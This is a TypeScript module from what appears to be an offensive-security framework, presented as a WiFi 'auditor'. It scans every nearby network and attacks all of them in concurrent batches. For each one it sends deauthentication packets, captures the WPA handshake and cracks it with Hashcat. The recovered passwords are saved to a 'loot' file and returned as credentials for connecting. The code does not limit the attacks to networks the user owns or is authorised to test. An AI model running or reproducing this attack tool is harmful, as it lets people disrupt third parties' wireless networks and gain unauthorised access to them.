// @ts-nocheck
// ============================================================================
// SECTION 1: Imports
// ============================================================================

import { UI, COLOR_PALETTE } from "../../lib/ui";
import { MissionManifest, ModuleResult, NewAsset } from "../../lib/types";

// ============================================================================
// SECTION 2: Constants
// ============================================================================

const CONCURRENT_ATTACKS = 10;
const DEAUTH_PACKETS = 10;
const CRACKED_WIFI_FILE = "./loot/cracked_wifi.txt";
const TMP_DIR = "./tmp";

// ============================================================================
// SECTION 3: Module Metadata
// ============================================================================

export const meta = {
  name: "wifi",
  command: "wifi",
  description: "WiFi auditor - scan, crack all networks, and connect",
  requires: [],
  inputs: [],
  outputs: ["wifi_credentials"],
};

// ============================================================================
// SECTION 4: Types
// ============================================================================

interface WiFiNetwork {
  bssid: string;
  ssid: string;
  signal: number;
  encryption?: string;
  cracked?: boolean;
  password?: string;
}

interface CrackedWiFiEntry {
  bssid: string;
  ssid: string;
  password: string;
  crackedAt: string;
}

// ============================================================================
// SECTION 5: Core Logic (run function)
// ============================================================================

export async function run(
  mission: MissionManifest,
  ui: UI,
  args?: string[]
): Promise<ModuleResult> {
  ui.section("WiFi Auditor");
  ui.info("Initializing wireless audit...");

  // Step 1: Get monitor interface
  const interfaces = await Networking.Wifi.GetInterfaces();
  const monitorIface = interfaces.find((i) => i.monitor);

  if (!monitorIface) {
    ui.error("No monitor mode interface found. Enable monitor mode first.");
    return { success: false, data: { error: "No monitor interface" } };
  }

  ui.success(`Using interface: ${monitorIface.name}`);

  // Step 2: Load previously cracked networks from file
  const crackedFromFile = await loadCrackedWifiFile();
  ui.info(`Loaded ${crackedFromFile.length} networks from cracked_wifi.txt`);

  // Step 3: Scan networks
  ui.info("Scanning for WiFi networks...");
  const allNetworks = await Networking.Wifi.Scan(monitorIface.name);
  
  if (allNetworks.length === 0) {
    ui.error("No networks found");
    return { success: false, data: { results: [] } };
  }

  // Filter valid networks and mark already cracked
  const networks: WiFiNetwork[] = allNetworks
    .filter((n) => n.bssid && n.ssid)
    .map((n) => {
      const cracked = crackedFromFile.find((c) => c.bssid === n.bssid);
      return {
        bssid: n.bssid,
        ssid: n.ssid,
        signal: n.signal || 0,
        encryption: n.encryption || "WPA2",
        cracked: !!cracked,
        password: cracked?.password,
      };
    });

  ui.success(`Found ${networks.length} networks`);
  ui.divider();

  // Step 4: Show current status (only if some networks need cracking)
  const alreadyCracked = networks.filter((n) => n.cracked);
  const toCrack = networks.filter((n) => !n.cracked);

  if (toCrack.length > 0 && alreadyCracked.length > 0) {
    // Show already cracked only when there are also networks to crack
    ui.success(`${alreadyCracked.length} networks already cracked`);
    displayNetworksTable(ui, alreadyCracked, true);
    ui.info(`${toCrack.length} networks to crack`);
    displayNetworksTable(ui, toCrack, false);
  } else if (toCrack.length > 0) {
    // All networks need cracking
    ui.info(`${toCrack.length} networks to crack`);
    displayNetworksTable(ui, toCrack, false);
  } else if (alreadyCracked.length > 0) {
    // All already cracked - skip intermediate display
    ui.success(`All ${alreadyCracked.length} networks already cracked from file`);
  }

  // Step 6: Crack remaining networks
  let newlyCracked: WiFiNetwork[] = [];
  
  if (toCrack.length > 0) {
    ui.section("Cracking Phase");
    newlyCracked = await crackNetworks(ui, monitorIface.name, toCrack);
    
    // Save newly cracked to file
    if (newlyCracked.length > 0) {
      await saveCrackedWifiFile(newlyCracked);
    }
  }

  // Combine all cracked networks
  const allCracked = [...alreadyCracked, ...newlyCracked];

  if (allCracked.length === 0) {
    ui.error("No networks cracked. Cannot proceed to connection.");
    return { success: false, data: { cracked: 0, networks: networks.length } };
  }

  // Step 6: Display cracked networks with signal strength
  ui.section("Cracked Networks Available");
  displayCrackedNetworks(ui, allCracked);

  // Step 8: Prompt user to select network to connect
  const selection = await uiPrompt(ui, "\nSelect network index to connect (or 'q' to skip): ");
  
  if (selection.toLowerCase() === "q") {
    ui.info("Skipping connection phase");
    return buildResult(allCracked, networks.length);
  }

  const idx = parseInt(selection);
  if (isNaN(idx) || idx < 0 || idx >= allCracked.length) {
    ui.error("Invalid selection");
    return buildResult(allCracked, networks.length);
  }

  const selected = allCracked[idx];
  ui.success(`Selected: ${selected.ssid} (${selected.bssid})`);
  ui.info(`Password: ${selected.password}`);
  
  // Note: Connection would use Networking.Wifi.Connect if available
  // For now, we display credentials for manual connection
  ui.success("Credentials ready for connection");

  return buildResult(allCracked, networks.length, selected);
}

// ============================================================================
// SECTION 6: Helper Functions
// ============================================================================

async function loadCrackedWifiFile(): Promise<CrackedWiFiEntry[]> {
  try {
    const content = await FileSystem.ReadFile(CRACKED_WIFI_FILE, { absolute: false });
    if (!content) return [];
    
    const lines = content.split("\n").filter(l => l.trim());
    const entries: CrackedWiFiEntry[] = [];
    
    for (const line of lines) {
      const parts = line.split("|");
      if (parts.length >= 3) {
        entries.push({
          bssid: parts[0].trim(),
          ssid: parts[1].trim(),
          password: parts[2].trim(),
          crackedAt: parts[3]?.trim() || new Date().toISOString(),
        });
      }
    }
    return entries;
  } catch {
    return [];
  }
}

async function saveCrackedWifiFile(networks: WiFiNetwork[]): Promise<void> {
  try {
    // Ensure loot dir exists
    await FileSystem.Mkdir("./loot", { recursive: true });
    
    // Load existing to avoid duplicates
    const existing = await loadCrackedWifiFile();
    const existingBssids = new Set(existing.map(e => e.bssid));
    
    // Add new entries
    const newEntries = networks
      .filter(n => n.password && !existingBssids.has(n.bssid))
      .map(n => `${n.bssid}|${n.ssid}|${n.password}|${new Date().toISOString()}`);
    
    if (newEntries.length === 0) return;
    
    // Append to file
    const content = newEntries.join("\n") + "\n";
    await FileSystem.WriteFile(CRACKED_WIFI_FILE, content, { append: true, absolute: false });
  } catch {
    // Ignore save errors
  }
}

function displayNetworksTable(ui: UI, networks: WiFiNetwork[], cracked: boolean): void {
  const rows = networks.map((n, i) => {
    const signalBar = getSignalBar(n.signal);
    return {
      "#": String(i),
      "SSID": n.ssid,
      "BSSID": n.bssid,
      "Signal": `${n.signal} ${signalBar}`,
      "Status": cracked && n.password ? "🔓 " + n.password : "🔒",
    };
  });

  ui.table(["#", "SSID", "BSSID", "Signal", "Status"], rows);
}

function displayCrackedNetworks(ui: UI, networks: WiFiNetwork[]): void {
  // Sort by signal strength (descending)
  const sorted = [...networks].sort((a, b) => b.signal - a.signal);
  
  const rows = sorted.map((n, i) => {
    const signalBar = getSignalBar(n.signal);
    const signalColor = n.signal >= 3 ? COLOR_PALETTE.green : 
                       n.signal >= 1 ? COLOR_PALETTE.yellow : COLOR_PALETTE.red;
    
    return {
      "#": String(i),
      "SSID": n.ssid.substring(0, 20),
      "BSSID": n.bssid,
      "Signal": `${n.signal} ${signalBar}`,
      "Password": n.password || "???",
    };
  });

  ui.table(["#", "SSID", "BSSID", "Signal", "Password"], rows, {
    rowColor: (row) => {
      const signal = parseInt(row.Signal as string) || 0;
      if (signal >= 3) return COLOR_PALETTE.green;
      if (signal >= 1) return COLOR_PALETTE.yellow;
      return COLOR_PALETTE.red;
    }
  });
}

function getSignalBar(signal: number): string {
  const bars = Math.max(0, Math.min(4, signal));
  return "█".repeat(bars) + "░".repeat(4 - bars);
}

async function crackNetworks(
  ui: UI,
  ifaceName: string,
  networks: WiFiNetwork[]
): Promise<WiFiNetwork[]> {
  const results: WiFiNetwork[] = [];
  const totalBatches = Math.ceil(networks.length / CONCURRENT_ATTACKS);

  for (let i = 0; i < networks.length; i += CONCURRENT_ATTACKS) {
    const batchNum = Math.floor(i / CONCURRENT_ATTACKS) + 1;
    const batch = networks.slice(i, i + CONCURRENT_ATTACKS);

    ui.info(`Batch ${batchNum}/${totalBatches}: Attacking ${batch.length} networks...`);

    const batchResults = await Promise.all(
      batch.map((n) => crackSingleNetwork(ifaceName, n, ui))
    );

    for (const result of batchResults) {
      if (result.password) {
        results.push(result);
        ui.success(`Cracked: ${result.ssid} → ${result.password}`);
      }
    }
  }

  ui.success(`Cracking complete: ${results.length}/${networks.length} cracked`);
  return results;
}

async function crackSingleNetwork(
  ifaceName: string,
  target: WiFiNetwork,
  ui: UI
): Promise<WiFiNetwork> {
  try {
    // Ensure tmp dir exists
    await FileSystem.Mkdir(TMP_DIR, { recursive: true });
    
    // Deauth
    await Networking.Wifi.Deauth(ifaceName, target.bssid, { packets: DEAUTH_PACKETS });
    
    // Capture handshake (pcap goes to current dir by default)
    const pcapFile = await Networking.Wifi.CaptureHandshake(ifaceName, target.bssid);
    if (!pcapFile) {
      return { ...target, cracked: false };
    }

    // Crack with Hashcat
    let password: string | null = null;
    try {
      password = await Crypto.Hashcat.Decrypt(pcapFile);
    } catch {
      // Try with full path
      try {
        const cwd = await FileSystem.cwd();
        const fullPath = `${cwd.absolutePath}/${pcapFile}`;
        password = await Crypto.Hashcat.Decrypt(fullPath);
      } catch {
        // Failed
      }
    }

    // Cleanup pcap - try both relative and absolute paths
    try {
      await FileSystem.Remove(pcapFile);
    } catch {
      try {
        const cwd = await FileSystem.cwd();
        await FileSystem.Remove(`${cwd.absolutePath}/${pcapFile}`);
      } catch {
        // Ignore cleanup errors
      }
    }

    if (password) {
      return { ...target, cracked: true, password };
    }
  } catch {
    // Ignore errors, return uncracked
  }

  return { ...target, cracked: false };
}

async function uiPrompt(ui: UI, message: string): Promise<string> {
  // Use global prompt if available, otherwise simulate
  if (typeof prompt === "function") {
    return prompt(message) || "";
  }
  return "";
}

function buildResult(
  cracked: WiFiNetwork[],
  totalNetworks: number,
  selected?: WiFiNetwork
): ModuleResult {
  const newAssets: NewAsset[] = cracked.map((n) => ({
    type: "credential",
    value: { user: "", pass: n.password, source: `wifi:${n.bssid}:${n.ssid}` },
    parent: n.bssid,
  }));

  return {
    success: cracked.length > 0,
    data: {
      cracked: cracked.length,
      total: totalNetworks,
      selected: selected || null,
      networks: cracked.map((n) => ({
        ssid: n.ssid,
        bssid: n.bssid,
        signal: n.signal,
        password: n.password,
      })),
    },
    newAssets,
  };
}

// ============================================================================
// SECTION 7: Default Export
// ============================================================================

export default { meta, run };
